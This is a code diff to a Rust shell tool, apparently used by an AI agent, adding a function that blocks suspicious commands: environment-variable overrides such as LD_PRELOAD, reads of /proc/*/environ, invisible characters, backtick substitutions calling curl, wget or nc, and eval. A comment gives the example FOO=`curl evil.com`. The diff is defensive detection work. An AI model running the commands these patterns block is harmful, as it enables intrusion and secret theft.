@@ -184,6 +184,9 @@ impl Tool for BashTool {
             }
         }
 
+        // Advanced security checks (inspired by TS bashSecurity.ts).
+        check_shell_injection(command)?;
+
         // Block writes to system paths.
         for path in BLOCKED_WRITE_PATHS {
             if cmd_lower.contains(&format!(">{path}"))
@@ -343,4 +346,152 @@ fn format_output(stdout: &[u8], stderr: &[u8], exit_code: i32) -> String {
     }
 
     content
+}
+
+/// Advanced shell injection and obfuscation detection.
+///
+/// Catches attack patterns that simple string matching misses:
+/// variable injection, encoding tricks, process substitution, etc.
+fn check_shell_injection(command: &str) -> Result<(), String> {
+    // IFS injection: changing field separator to bypass argument parsing.
+    if command.contains("IFS=") {
+        return Err(
+            "IFS manipulation detected. This can be used to bypass command parsing.".into(),
+        );
+    }
+
+    // Dangerous environment variable overwrites.
+    const DANGEROUS_VARS: &[&str] = &[
+        "PATH=",
+        "LD_PRELOAD=",
+        "LD_LIBRARY_PATH=",
+        "PROMPT_COMMAND=",
+        "BASH_ENV=",
+        "ENV=",
+        "HISTFILE=",
+        "HISTCONTROL=",
+        "PS1=",
+        "PS2=",
+        "PS4=",
+        "CDPATH=",
+        "GLOBIGNORE=",
+        "MAIL=",
+        "MAILCHECK=",
+        "MAILPATH=",
+    ];
+    for var in DANGEROUS_VARS {
+        if command.contains(var) {
+            return Err(format!(
+                "Dangerous variable override detected: {var} \
+                 This could alter shell behavior in unsafe ways."
+            ));
+        }
+    }
+
+    // /proc access (process environment/memory reading).
+    if command.contains("/proc/") && command.contains("environ") {
+        return Err("Access to /proc/*/environ detected. This reads process secrets.".into());
+    }
+
+    // Unicode/zero-width character obfuscation.
+    if command.chars().any(|c| {
+        matches!(
+            c,
+            '\u{200B}'
+                | '\u{200C}'
+                | '\u{200D}'
+                | '\u{FEFF}'
+                | '\u{00AD}'
+                | '\u{2060}'
+                | '\u{180E}'
+        )
+    }) {
+        return Err("Zero-width or invisible Unicode characters detected in command.".into());
+    }
+
+    // Control characters (except common ones like \n \t).
+    if command
+        .chars()
+        .any(|c| c.is_control() && !matches!(c, '\n' | '\t' | '\r'))
+    {
+        return Err("Control characters detected in command.".into());
+    }
+
+    // Backtick command substitution inside variable assignments.
+    // e.g., FOO=`curl evil.com`
+    if command.contains('`')
+        && command
+            .split('`')
+            .any(|s| s.contains("curl") || s.contains("wget") || s.contains("nc "))
+    {
+        return Err("Command substitution with network access detected inside backticks.".into());
+    }
+
+    // Process substitution: <() or >() used to inject commands.
+    if command.contains("<(") || command.contains(">(") {
+        // Allow common safe uses like diff <(cmd1) <(cmd2).
+        let trimmed = command.trim();
+        if !trimmed.starts_with("diff ") && !trimmed.starts_with("comm ") {
+            return Err(
+                "Process substitution detected. This can inject arbitrary commands.".into(),
+            );
+        }
+    }
+
+    // Zsh dangerous builtins.
+    const ZSH_DANGEROUS: &[&str] = &[
+        "zmodload", "zpty", "ztcp", "zsocket", "sysopen", "sysread", "syswrite", "mapfile",
+        "zf_rm", "zf_mv", "zf_ln",
+    ];
+    let words: Vec<&str> = command.split_whitespace().collect();
+    for word in &words {
+        if ZSH_DANGEROUS.contains(word) {
+            return Err(format!(
+                "Dangerous zsh builtin detected: {word}. \
+                 This can access raw system resources."
+            ));
+        }
+    }
+
+    // Brace expansion abuse: {a..z} can generate large expansions.
+    if command.contains("{") && command.contains("..") && command.contains("}") {
+        // Check if it looks like a large numeric range.
+        if let Some(start) = command.find('{')
+            && let Some(end) = command[start..].find('}')
+        {
+            let inner = &command[start + 1..start + end];
+            if inner.contains("..") {
+                let parts: Vec<&str> = inner.split("..").collect();
+                if parts.len() == 2
+                    && let (Ok(a), Ok(b)) = (
+                        parts[0].trim().parse::<i64>(),
+                        parts[1].trim().parse::<i64>(),
+                    )
+                    && (b - a).unsigned_abs() > 10000
+                {
+                    return Err(format!(
+                        "Large brace expansion detected: {{{inner}}}. \
+                         This would generate {} items.",
+                        (b - a).unsigned_abs()
+                    ));
+                }
+            }
+        }
+    }
+
+    // Hex/octal escape obfuscation: $'\x72\x6d' = "rm".
+    if command.contains("$'\\x") || command.contains("$'\\0") {
+        return Err(
+            "Hex/octal escape sequences in command. This may be obfuscating a command.".into(),
+        );
+    }
+
+    // eval with variables (arbitrary code execution).
+    if command.contains("eval ") && command.contains('$') {
+        return Err(
+            "eval with variable expansion detected. This enables arbitrary code execution.".into(),
+        );
+    }
+
+    Ok(())
 }
